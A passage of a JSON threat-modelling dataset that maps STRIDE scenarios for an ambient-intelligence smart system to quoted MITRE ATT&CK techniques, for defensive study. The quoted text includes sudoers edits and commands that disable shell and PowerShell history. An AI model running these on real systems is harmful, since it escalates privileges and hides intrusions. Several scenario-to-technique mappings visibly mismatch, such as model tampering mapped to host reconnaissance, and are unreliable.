            "Scenario": "An attacker could overload the communication infrastructure with traffic, causing devices to be unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "There are no rate-limiting or traffic-shaping mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network traffic control measures."
                },
                {
                    "Assumption": "The attacker has access to the network or remote capabilities to send massive traffic.",
                    "Role": "Malicious Actor",
                    "Condition": "Network vulnerabilities exist."
                },
                {
                    "Assumption": "Critical components of the communication infrastructure are not redundant.",
                    "Role": "System Architect",
                    "Condition": "Lack of infrastructure redundancy."
                }
            ],
            "Potential Impact": "System unavailability and user inconvenience.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network",
                "traffic",
                "unresponsive"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware could be introduced to the system, making key devices (like smart locks or cameras) unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Devices are not equipped with anti-malware protection.",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of anti-malware solutions."
                },
                {
                    "Assumption": "The attacker has the capability to introduce malware to the system.",
                    "Role": "Malicious Actor",
                    "Condition": "System vulnerabilities exist."
                },
                {
                    "Assumption": "There is no real-time monitoring for malware activities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of real-time monitoring."
                }
            ],
            "Potential Impact": "Loss of functionality for critical security devices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "device",
                "unresponsive"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability in the AI/ML models causing them to crash or behave erratically.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models are not robust against malformed inputs.",
                    "Role": "AI Engineer",
                    "Condition": "Lack of robust input validation."
                },
                {
                    "Assumption": "The attacker has access to inject inputs into the models.",
                    "Role": "Malicious Actor",
                    "Condition": "Vulnerability in input handling or model access."
                },
                {
                    "Assumption": "There are no fallback mechanisms or redundancy plans for AI/ML failures.",
                    "Role": "System Architect",
                    "Condition": "Lack of redundancy design."
                }
            ],
            "Potential Impact": "System instability and disruption of personalized services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ai",
                "ml",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit vulnerabilities in the system to execute commands with higher privileges than allowed.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities in the system software.",
                    "Role": "System Administrator",
                    "Condition": "Lack of regular patch updates."
                },
                {
                    "Assumption": "Privilege separation is not enforced effectively.",
                    "Role": "System Architect",
                    "Condition": "Weak enforcement of least privilege principle."
                },
                {
                    "Assumption": "The attacker has knowledge of system vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Access to vulnerability information."
                }
            ],
            "Potential Impact": "Unauthorized system control and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "command execution",
                "privilege"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider could gain higher privileges by exploiting known but mitigatable weaknesses in the configuration.",
            "Assumptions": [
                {
                    "Assumption": "Critical system configurations are not regularly reviewed and updated.",
                    "Role": "System Administrator",
                    "Condition": "Lack of configuration review policies."
                },
                {
                    "Assumption": "Access control mechanisms do not capture privilege escalation activities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of monitoring and alerting for privilege escalation."
                },
                {
                    "Assumption": "An insider knows the weaknesses in the configuration.",
                    "Role": "Insider Threat",
                    "Condition": "Knowledge of system configurations and weaknesses."
                }
            ],
            "Potential Impact": "Unauthorized data access, modification, or deletion.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "configuration",
                "insider",
                "access control"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could leverage malware campaigns, such as those described in the CVE and OTX data, to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Relevant vulnerabilities exist and are unpatched.",
                    "Role": "System Administrator",
                    "Condition": "Lack of regular patch management."
                },
                {
                    "Assumption": "Existing security measures do not detect or block the malware variants.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient malware detection solutions."
                },
                {
                    "Assumption": "The attacker can deliver and execute the malware in the environment.",
                    "Role": "Malicious Actor",
                    "Condition": "Delivery methods and execution vectors are available."
                }
            ],
            "Potential Impact": "Gain of administrative access to control and manipulate system functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "malware",
                "administrative access",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by stealing login credentials to access the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are exposed",
                    "Role": "Attacker",
                    "Condition": "Phishing attack or leaked data breach"
                },
                {
                    "Assumption": "Authentication process does not have multi-factor authentication (MFA)",
                    "Role": "System Administrator",
                    "Condition": "Only passwords or pins are used for authentication"
                },
                {
                    "Assumption": "Access logs are not monitored rigorously",
                    "Role": "Security Team",
                    "Condition": "Incorrectly interpreted or missed log reviews"
                }
            ],
            "Potential Impact": "Confidentiality breach and unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "phishing",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake device to communicate with legitimate sensors and actuators in the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Device authentication is insufficiently secured",
                    "Role": "System Admin",
                    "Condition": "Device IDs are guessable or encryption is weak"
                },
                {
                    "Assumption": "Network communication is not encrypted",
                    "Role": "Network Admin",
                    "Condition": "Traffic is sent in plaintext"
                },
                {
                    "Assumption": "No anomaly detection mechanisms in place",
                    "Role": "Security Team",
                    "Condition": "Unusual activities from unknown devices are not flagged"
                }
            ],
            "Potential Impact": "Tampering with sensor data and actuator behavior.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "anomaly detection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Bypass biometric authentication using a high-quality spoofed fingerprint or facial image.",
            "Assumptions": [
                {
                    "Assumption": "Biometric templates are improperly secured",
                    "Role": "System Admin",
                    "Condition": "Stored in an unencrypted database"
                },
                {
                    "Assumption": "The biometric scanner has known vulnerabilities",
                    "Role": "Hardware Vendor",
                    "Condition": "Scanner firmware is outdated"
                },
                {
                    "Assumption": "No physical access controls in place",
                    "Role": "Facility Security",
                    "Condition": "Access to scanners is unguarded"
                }
            ],
            "Potential Impact": "Unauthorized physical access and misuse of AmI system controls.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometrics",
                "fingerprint",
                "facial recognition"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of sensors to provide false data to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process is not secure",
                    "Role": "Firmware Developer",
                    "Condition": "No code signing or validation of updates"
                },
                {
                    "Assumption": "Physical access to devices is insufficiently protected",
                    "Role": "Facility Security",
                    "Condition": "Devices are exposed and accessible"
                },
                {
                    "Assumption": "Network lacks segmentation",
                    "Role": "Network Admin",
                    "Condition": "Malicious firmware download from compromised network segment"
                }
            ],
            "Potential Impact": "Tampering with data integrity and system decision making.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "sensor",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious changes are made to the AI/ML models to alter their decision-making processes.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML model training is not secure",
                    "Role": "Data Scientist",
                    "Condition": "Training data can be manipulated"
                },
                {
                    "Assumption": "Models are updated dynamically without verification",
                    "Role": "System Admin",
                    "Condition": "Lack of model validation checks"
                },
                {
                    "Assumption": "AI/ML models are stored on susceptible servers",
                    "Role": "IT Admin",
                    "Condition": "Servers lack proper hardening"
                }
            ],
            "Potential Impact": "Poor decisions leading to unsafe or inefficient operations.",
            "MITRE ATT&CK Keywords": [
                "model tampering",
                "machine learning",
                "AI",
                "data poisoning"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates stored data in the data repositories, impacting historical analysis.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls",
                    "Role": "Database Admin",
                    "Condition": "Lack of proper user role and permissions management"
                },
                {
                    "Assumption": "Data is not encrypted at rest",
                    "Role": "IT Admin",
                    "Condition": "Stored in plaintext"
                },
                {
                    "Assumption": "Data integrity checks are not performed",
                    "Role": "System Designer",
                    "Condition": "No hashing or checksums in place"
                }
            ],
            "Potential Impact": "Incorrect analytics and impaired decision-making process.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data repository",
                "data integrity",
                "historical analysis"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having performed actions by deleting or altering logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not write-protected",
                    "Role": "System Admin",
                    "Condition": "Users have write access to logs"
                },
                {
                    "Assumption": "Insufficient log integrity controls",
                    "Role": "Security Officer",
                    "Condition": "No tamper-evident logging mechanisms"
                },
                {
                    "Assumption": "No backups or redundant log storage strategies",
                    "Role": "IT Admin",
                    "Condition": "Logs only stored locally"
                }
            ],
            "Potential Impact": "Loss of accountability and difficulty in fault tracking.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "accountability",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker masks their activities by modifying time stamps and log entries.",
            "Assumptions": [
                {
                    "Assumption": "Log entries are not adequately secured",
                    "Role": "System Admin",
                    "Condition": "Logs can be edited without detection"
                },
                {
                    "Assumption": "System time is not synchronized",
                    "Role": "IT Admin",
                    "Condition": "No NTP or time synchronization mechanisms"
                },
                {
                    "Assumption": "Logs are not regularly reviewed",
                    "Role": "Security Team",
                    "Condition": "Manual or infrequent log review processes"
                }
            ],
            "Potential Impact": "Misleading forensic analysis and undetected intrusions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "time stamps",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Time Providers",
                "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
                "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
                "technique_id": "T1547.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized actions taken using shared credentials lead to difficulties in attributing actions to individuals.",
            "Assumptions": [
                {
                    "Assumption": "Users share accounts and passwords",
                    "Role": "Users",
                    "Condition": "Single set of credentials used by multiple people"
                },
                {
                    "Assumption": "No unique session tracking",
                    "Role": "System Admin",
                    "Condition": "Sessions cannot be individually traced"
                },
                {
                    "Assumption": "Authentication event logs are not maintained",
                    "Role": "IT Admin",
                    "Condition": "No logging of session start/stop times"
                }
            ],
            "Potential Impact": "Disputed actions and compromised security monitoring.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "shared credentials",
                "session tracking",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Authentication Package",
